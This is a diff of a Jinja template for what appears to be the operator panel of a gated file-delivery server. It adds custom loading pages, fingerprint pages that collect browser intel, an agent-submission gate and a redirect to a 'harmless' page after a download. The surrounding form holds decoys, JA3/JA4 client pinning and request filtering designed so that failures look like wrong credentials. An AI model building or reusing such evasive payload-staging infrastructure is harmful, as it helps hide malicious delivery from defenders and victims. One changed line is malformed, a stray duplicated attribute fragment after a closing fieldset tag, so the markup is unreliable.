@@ -100,6 +100,10 @@
         <label><span>WHILE HELD {% tip "What a visitor sees before approval / admission: blank 204, a placeholder page, the decoy, a loading page (auto-retries until admitted), or a fingerprint page (collects browser intel, then loads until admitted)." %}</span><select class="field-input" name="placeholder">{% for value, label in placeholders %}<option value="{{ value }}" {% if link.placeholder == value %}selected{% endif %}>{{ label }}</option>{% endfor %}</select></label>
         <label><span>ON DENY {% tip "What a denied or banned visitor gets: 404, the decoy, or your benevolent content below." %}</span><select class="field-input" name="on_deny">{% for value, label in denies %}<option value="{{ value }}" {% if link.on_deny == value %}selected{% endif %}>{{ label }}</option>{% endfor %}</select></label>
       </div>
+      <div class="grid-2">
+        <label data-show-when="placeholder:loading"><span>LOADING PAGE {% tip "Pick a custom page from ./loading/ (advanced). Empty = the built-in neutral loading page." %}</span><select class="field-input mono" name="loading_page"><option value="">(built-in)</option>{% for page in loading_pages %}<option value="{{ page }}" {% if link.loading_page == page %}selected{% endif %}>{{ page }}</option>{% endfor %}</select></label>
+        <label data-show-when="placeholder:fingerprint"><span>FINGERPRINT PAGE {% tip "Pick a custom page from ./fingerprint/ (advanced). It must POST the intel JSON back to the same URL - see docs/fingerprint-pages.md." %}</span><select class="field-input mono" name="fingerprint_page"><option value="">(built-in)</option>{% for page in fingerprint_pages %}<option value="{{ page }}" {% if link.fingerprint_page == page %}selected{% endif %}>{{ page }}</option>{% endfor %}</select></label>
+      </div>
       <details class="adv" {% if link.ja3_fingerprint or link.ja4_fingerprint or link.watermark %}open{% endif %}>
         <summary>FINGERPRINTS &amp; WATERMARKING <span class="adv-hint">JA3/JA4 client pinning · per-release leak markers</span></summary>
         <div class="grid-3">
@@ -109,7 +113,7 @@
         </div>
       </details>
       <div class="grid-3">
-        <label class="check"><input type="checkbox" name="requires_approval" {% if link.requires_approval %}checked{% endif %}> <span>VERIFICATION GATE {% tip "Submissions queue for an operator decision (panel, mobile, or Telegram). Auto-decision rules can pre-approve clean-looking ones." %}</span></label>
+        <label class="check" data-show-when="gate_type:submission"><input type="checkbox" name="requires_approval" {% if link.requires_approval %}checked{% endif %}> <span>VERIFICATION GATE {% tip "Submission gate only: the agent POSTs an encrypted package, an operator approves, then the content releases. It cannot work on other gate types (no package ever arrives) - use operator admission there instead." %}</span></label>
         <label class="check"><input type="checkbox" name="one_time" {% if link.one_time %}checked{% endif %}> <span>ONE-TIME {% tip "The link deactivates after the first successful release - pairs well with replay dedupe." %}</span></label>
         <label class="check"><input type="checkbox" name="active" {% if link.active or link is None %}checked{% endif %}> <span>ACTIVE</span></label>
       </div>
@@ -124,7 +128,13 @@
           </span>
         </label>
       </div>
-    </fieldset>
+      <details class="adv" data-show-when="kind:file|proxy" {% if link.post_download_url or link.pk and not link.post_download_redirect %}open{% endif %}>
+        <summary>AFTER THE DOWNLOAD <span class="adv-hint">advanced - where the visitor lands once the file starts</span></summary>
+        <label class="check"><input type="checkbox" name="post_download_redirect" {% if link.post_download_redirect or link is None %}checked{% endif %}> <span>REDIRECT AFTER DOWNLOAD {% tip "Serves a small download page that starts the file, then sends the visitor to a harmless page. Off = the raw file answers the link directly." %}</span></label>
+        <label><span>CUSTOM TARGET (optional) {% tip "Where the visitor goes after the download starts. Empty = the link's benevolent target, picked once at creation and never rotated." %}</span><input class="field-input mono" type="url" name="post_download_url" value="{{ link.post_download_url }}" placeholder="https://www.example.com/thank-you"></label>
+        {% if link.benevolent_target %}<p class="muted" style="font-size:.66rem">Benevolent target for this link: <span class="mono">{{ link.benevolent_target }}</span></p>{% endif %}
+      </details>
+    </fieldset> data-feature-when="gate_type:network" {% if link.allowed_ips or link.allowed_uas or link.header_contract or link.replay_dedupe or link.active_window_start or link.gate_type == "network" %}open{% endif %}>
     <details class="adv" data-autoopen-when="gate_type:network" data-feature-when="gate_type:network" {% if link.allowed_ips or link.allowed_uas or link.header_contract or link.replay_dedupe or link.active_window_start or link.gate_type == "network" %}open{% endif %}>
       <summary>NETWORK PROFILE <span class="adv-hint">IP/UA allow-lists · header contract · time window · replay dedupe</span></summary>
       <p class="muted" style="font-size:.66rem;margin-top:0">Malleable contract - requests that don't match are dropped before any gate check, so failures look like wrong credentials.</p>
